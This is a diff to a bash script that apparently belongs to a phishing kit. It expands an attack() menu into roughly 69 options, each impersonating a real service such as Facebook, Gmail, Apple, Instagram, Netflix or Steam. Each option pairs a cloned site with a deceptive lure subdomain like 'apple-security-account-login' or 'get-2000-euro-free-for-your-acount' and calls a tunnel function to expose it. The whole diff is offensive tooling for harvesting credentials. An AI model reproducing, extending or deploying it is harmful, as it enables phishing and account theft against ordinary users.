@@ -969,33 +969,444 @@ xterm -e nohup mpv .notifications/find_login.mp3 > /dev/null 2>&1
 
 
 attack() {
-    GREEN="\033[1;32m"
-    WHITE="\033[1;37m"
-    CYAN="\033[1;36m"
-    RED="\033[1;31m"
-    RESETBG="\033[0m"
+ 
+ { clear; header; echo; }
 
-    { clear; header; echo; }
+	cat <<- EOF
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} SARAH
+	EOF
+	
+	
+	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}
 
-    # Display menu
-    echo -e "${GREEN}[${WHITE}1${GREEN}]${CYAN} Sarah"
+	case $REPLY in 
+	
+	    1)
+			site="sarah"
+			subdomain='http://project'
+			tunnel;;
+			
+			
+	    2)
+			site="amazon"
+			subdomain='http://amazon-pro-membership-lifetime-for-you'
+			tunnel;;
+				
+				
+	    3)
+			site="apple"
+			subdomain='http://apple-security-account-login'
+			tunnel;;				
+			
+			
+        4)
+			site="badoo"
+			subdomain='http://get-2000-euro-free-for-your-acount'
+			tunnel;;
+			
+			
+		5)
+			site="care2"
+			subdomain='http://get-2000-tokens-free-for-your-acount'
+			tunnel;;	
+			
+			
+	    6)
+			site="clashofclans"
+			subdomain='http://get-free-character-for-clashofclans-game'
+			tunnel;;	
+	 		
+	 		
+	    7)
+			site="crunchyroll"
+			subdomain='http://get-free-character-for-crunchyroll-game'
+			tunnel;;
+		
+		
+		8)
+			site="deviantart"
+			subdomain='http://deviantart-upgrade-account-pro-for-free'
+			tunnel;;
+		
+		
+		9)
+			site="discord"
+			subdomain='http://discord-upgrade-account-pro-for-free'
+			tunnel;;
+		
+		
+		10)
+			site="dota2"
+			subdomain='http://dota-upgrade-account-pro-for-free'
+			tunnel;;
+					
+			
+		11)
+			site="dropbox"
+			subdomain='http://get-2TB-cloud-storage-free'
+			tunnel;;	
 
-    # User input
-    read -p "${GREEN}[${WHITE}-${GREEN}] Select an option: ${WHITE}" option
 
-    # Handle Option 1
-    case $option in
-        1)
-            site="Sarah"
-            echo -e "${CYAN}Site set to: $site${RESETBG}"
-            ;;
-        *)
-            echo -e "${RED}Invalid option. Try again.${RESETBG}"
-            sleep 1
-            attack
-            ;;
-    esac
+        12)
+			site="ebay"
+			subdomain='http://ebay-upgrade-account-for-free'
+			tunnel;;
+
+
+		13)
+		    site="facebook"
+			subdomain='http://secure-verified-account-for-facebook'
+			tunnel;;	
+			
+			
+		14)
+			site="facebook_messenger"
+			subdomain='http://messenger-premium-features-for-free'
+			tunnel;; 	
+			
+          
+        15)
+            site="facebook_security"
+			subdomain='http://make-your-facebook-secured-from-hackers'
+			tunnel;;  
+
+	     
+	    16)		
+	 		site="gmail"
+			subdomain='http://get-unlimited-google-drive-free'
+			tunnel;;
+			
+			
+	    17)		
+	 		site="goodreads"
+			subdomain='http://goodreads-updrade-account-lifetime-free'
+			tunnel;;
+	   		
+	   		
+	    18)
+			site="hotstar"
+			subdomain='http://hotstar-premieum-account-for-free'
+			tunnel;;		
+	   		
+	   	
+	   	19)
+			site="icloud"
+			subdomain='http://get-2TB-cloud-storage-free'
+			tunnel;;		
+	   	
+	   	
+	   	20)
+			site="influenster"
+			subdomain='http://update-account-to-premium-free'
+			tunnel;;		
+	   	
+	   		
+	    21)
+			site="instagram"
+			subdomain='http://secure-login-for-instagram'
+			tunnel;;
+			
+			
+	    22)
+		    site="instagram_followers"
+			subdomain='http://get-10000-followers-for-instagram'
+			tunnel;;			
+			
+	 
+	    23)
+			site="instagram_followers_2"
+			subdomain='http://get-10000-followers-for-instagram'
+			tunnel;;		
+		
+		
+	    24)
+			site="instagram_verify"
+			subdomain='http://instagram-verify-account'
+			tunnel;;
+			
+			
+	    25)
+			site="line"
+			subdomain='http://line-get-free-tokens-for-speech'
+			tunnel;;
+					
+			
+	    26)
+			site="linkedin"
+			subdomain='http://get-a-premium-plan-for-linkedin-free'
+			tunnel;;
+		
+		
+	    27)
+			site="livejournal"
+			subdomain='http://get-a-premium-plan-for-livejournal-free'
+			tunnel;;
+		
+		
+		28) 
+            site="mediafire"
+			subdomain='http://get-2TB-cloud-storage-free'
+			tunnel;;
+		
+		
+		29)
+			site="mewe"
+			subdomain='http://mewe-update-account-to-premium-free'
+			tunnel;;		
+	   	
+			
+	   30) 
+            site="microsoft"
+			subdomain='http://unlimited-onedrive-space-for-free'
+			tunnel;;	
+		
+	   31)  
+	        site="mocospace"
+			subdomain='http://upgrade-your-mocospace-plan-free'
+			tunnel;;
+		
+			
+	   32)  
+	        site="myspace"
+			subdomain='http://upgrade-your-myspace-plan-free'
+			tunnel;;
+			
+		
+	   33)
+	        site="netflix"
+			subdomain='http://upgrade-your-netflix-plan-free'
+			tunnel;;	
+			
+	   34)
+	        site="origin"
+			subdomain='http://origin-upgrade-to-premium-account-free'
+			tunnel;;	
+		
+		
+	   35)  
+	        site="outlook"
+			subdomain='http://unlimited-onedrive-space-for-free'
+			tunnel;;	
+			
+	   36)  
+	        site="pinterest"
+			subdomain='http://get-a-premium-plan-for-pinterest-free'
+			tunnel;;	
+			
+	
+	   37)  
+	        site="playstation"
+			subdomain='http://playstation-premium-account-free'
+			tunnel;;		
+				
+					
+       38)  
+	        site="protonmail"
+			subdomain='http://protonmail-pro-basics-for-free'
+			tunnel;;
+		
+		
+	   39)  
+	        site="pubg"
+			subdomain='http://get-free-character-for-pubs-game'
+			tunnel;;	
+			
+			
+	   40)  
+	        site="quora"
+			subdomain='http://get-quora-premium-account-for-free-lifetime'
+			tunnel;;	
+			
+			
+	   41)  
+	        site="raverly"
+			subdomain='http://get-raverly-premium-account-for-free-'
+			tunnel;;	
+			
+			
+	   42)  
+	        site="reddit"
+			subdomain='http://reddit-official-verified-member-badge'
+			tunnel;;		
+				
+				
+	   43)  
+	        site="reverbnation"
+			subdomain='http://get-reverbnation-premium-account-for-free-'
+			tunnel;;	
+		
+		
+	   44)
+			site="signal"
+			subdomain='http://signal-get-free-tokens-for-speech'
+			tunnel;;	
+		
+		
+	   45)
+			site="skype"
+			subdomain='http://skype-get-free-tokens-for-speech'
+			tunnel;;	
+		
+		
+	   46)
+	        site="skyrock"
+			subdomain='http://skyrock-upgrade-to-premium-account-free'
+			tunnel;;	
+				
+					
+       47)  
+	        site="snapchat"
+			subdomain='http://view-locked-snapchat-accounts-secretly'
+			tunnel;;
+		
+	   48)  
+	        site="socialclub"
+			subdomain='http://-socialclub-update-account-to-premieum-free'
+			tunnel;;		
+		
+			
+	   49)  
+	        site="spotify"
+			subdomain='http://convert-your-account-to-spotify-premium'
+			tunnel;;		
+		
+		
+	   50)  
+	        site="stackoverflow"
+			subdomain='http://stackoverflow-convert-your-account-to-premium'
+			tunnel;;		
+			
+		
+	   51)  
+	        site="steam"
+			subdomain='http://steam-convert-your-account-to-premium'
+			tunnel;;		
+				
+	   52)  
+	        site="tagget"
+			subdomain='http://tagget-convert-your-account-to-premium'
+			tunnel;;		
+		
+			
+	   53)  
+	        site="telegram"
+			subdomain='http://telegram-get-free-tokens-for-speech'
+			tunnel;;	
+	
+	
+	   54)  
+	        site="tiktok"
+			subdomain='http://get-tiktok-100000-followers-free-at-instant'
+			tunnel;;
+	
+			
+	   55)  
+	        site="tiktok_followers"
+			subdomain='http://get-tiktok-100000-followers-free-at-instant'
+			tunnel;;
+					
+		
+	   56)  
+	        site="tumblr"
+			subdomain='http://tumblr-upgrade-account-to-premium-free'
+			tunnel;;
+		
+					
+       57)  
+	        site="twitch"
+			subdomain='http://unlimited-twitch-tv-user-for-free'
+			tunnel;;
+			
+			
+	   58)  
+	        site="twitter"
+			subdomain='http://get-blue-badge-on-twitter-free'
+			tunnel;;									
+		
+		
+	   59)  
+	        site="viber_out"
+			subdomain='http://viber-get-free-tokens-for-speech'
+			tunnel;;	
+		
+		
+	   60)  
+	        site="vimeo"
+			subdomain='http://get-100000-views-for-channel-free'
+			tunnel;;
+		
+			
+			
+	   61)  
+	        site="vk"
+			subdomain='http://vk-premium-real-method-2022-free'
+			tunnel;;		
+			
+					
+       62)  
+	        site="whatsapp"
+			subdomain='http://get-3000-free-tokens-for-free'
+			tunnel;;
+			
+			
+	   63)  
+	        site="wordpress"
+			subdomain='http://get-unlimited-wordpress-traffic-free'
+			tunnel;;
+	 	
+	 	
+	   64)  
+	        site="xanga"
+			subdomain='http://xanga-update-account-to-premieum'
+			tunnel;;	
+	 	
+	 	
+	   65)  
+	        site="xbox"
+			subdomain='http://xbox-premium-account-new-method-2022'
+			tunnel;;
+		
+	  
+	   66)  
+	        site="xing"
+			subdomain='http://xing-update-account-to-premieum'
+			tunnel;;	
+	 		
+				
+	 		
+	   67)  
+	        site="yahoo"
+			subdomain='http://grab-mail-from-anyother-yahoo-account-free'
+			tunnel;;
+			
+	   68)  
+	        site="yandex"
+			subdomain='http://grab-mail-from-anyother-yandex-account-free'
+			tunnel;;		
+		
+	   
+	   69)  
+	        site="youtube_subs"
+			subdomain='http://get-100000-youtube-subscribers-free'
+			tunnel;;	
+			
+	
+	   02)  
+	        other_sites;;
+	        
+	        
+	   99)  menu;;
+	    
+	        
+	   *)
+			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
+			{ sleep 0.7; attack;};;
+	  
+	esac
+
+
 }
+
 
 other_sites() {
  
